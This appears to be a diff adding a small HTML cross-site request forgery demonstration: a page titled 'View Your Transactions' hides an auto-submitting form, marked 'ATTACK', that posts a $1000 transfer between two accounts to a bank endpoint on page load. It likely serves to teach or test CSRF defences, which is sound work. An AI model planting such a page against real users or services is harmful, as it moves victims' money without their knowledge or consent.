@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>View Your Transactions</h1>
+    <ul>
+        <li>Sep. 17 - $17.14</li>
+        <li>Sep. 17 - $17.14</li>
+        <li>Sep. 17 - $17.14</li>
+    </ul>
+
+    <!-- ATTACK -->
+    <form action="http://bank.com/transferFunds" method="post">
+        <input type="hidden" name="sourceAccount" value="12345" />
+        <input type="hidden" name="destAccount" value="54321" />
+        <input type="hidden" name="amount" value="1000" />
+        <script>document.forms[0].submit()</script>        
+    </form> 
+
+</body>
+</html>
